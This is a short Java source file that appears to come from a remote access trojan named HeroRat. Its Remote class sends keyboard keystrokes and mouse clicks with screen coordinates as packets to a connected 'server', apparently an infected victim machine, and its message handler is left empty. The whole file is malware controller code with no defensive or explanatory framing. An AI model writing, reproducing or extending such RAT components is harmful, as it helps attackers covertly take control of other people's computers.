package net.herorat.features.remote;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet16Remote;


public class Remote
{
	public static void sendKey(Server server, int key)
	{
		Packet p = new Packet16Remote(server.outputstream, new String[] { "keyboard", String.valueOf(key) });
		p.write();
	}
	
	public static void sendMouse(Server server, int key, int x, int y)
	{
		Packet p = new Packet16Remote(server.outputstream, new String[] { "mouse", String.valueOf(key), String.valueOf(x), String.valueOf(y) });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
	}
}